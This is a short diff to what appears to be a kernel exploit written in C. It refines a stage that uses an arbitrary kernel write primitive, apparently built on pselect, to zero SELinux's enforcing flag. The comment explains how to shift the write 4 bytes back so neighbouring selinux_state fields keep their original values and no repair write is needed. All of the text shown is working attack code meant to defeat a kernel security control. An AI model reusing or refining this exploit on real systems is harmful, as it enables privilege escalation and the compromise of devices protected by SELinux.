@@ -213,6 +213,7 @@ static double timer_ms(void) {
 extern int pselect_custom_write;
 extern uintptr_t pselect_custom_target;
 extern int pselect_child_node;
+extern uintptr_t pselect_w1_shift_word;
 void set_pselect_write_mode(uintptr_t target, int mode);
 void clear_pselect_write(void);
 
@@ -1171,9 +1172,21 @@ int run_exploit(int argc, char **argv) {
       pr_warning("SELinux enforce unreadable; assuming enforcing and running W1\n");
     }
     TIMER("pre-W1 drain");
+    /* W1 shifted 4 bytes back. The write primitive stores an 8-byte word at
+     * `target`, so at the unshifted `selinux_state+0` the word's upper bytes
+     * land on checkreqprot / initialized / policycap[] and leave SELinux
+     * "permissive but smashed" (an even byte 2 clears `initialized` and breaks
+     * every later SID lookup). Shifted to -4 the word's low half lands in the
+     * all-zero hole in front of selinux_state (sel_netport_hash tail) and only
+     * bytes 4..7 reach the state, carrying the ORIGINAL values for enforcing /
+     * checkreqprot / initialized / policycap[0] = 00 00 01 01 (enforcing is the
+     * byte we zero). policycap[1..4] are never touched, so no repair shot is
+     * needed. */
+    pselect_w1_shift_word = 0x0101000000000000ULL;
     selinux_ok = retry_write_stage(
-        "W1: SELinux", data_addr(SELINUX_ENFORCING), 1, 15, 100000,
+        "W1: SELinux", data_addr(SELINUX_ENFORCING) - 4, 1, 15, 100000,
         verify_selinux_stage, NULL, 0);
+    pselect_w1_shift_word = 0;
     if (!selinux_ok) {
       pr_warning("Write 1 failed\n");
       return 1;
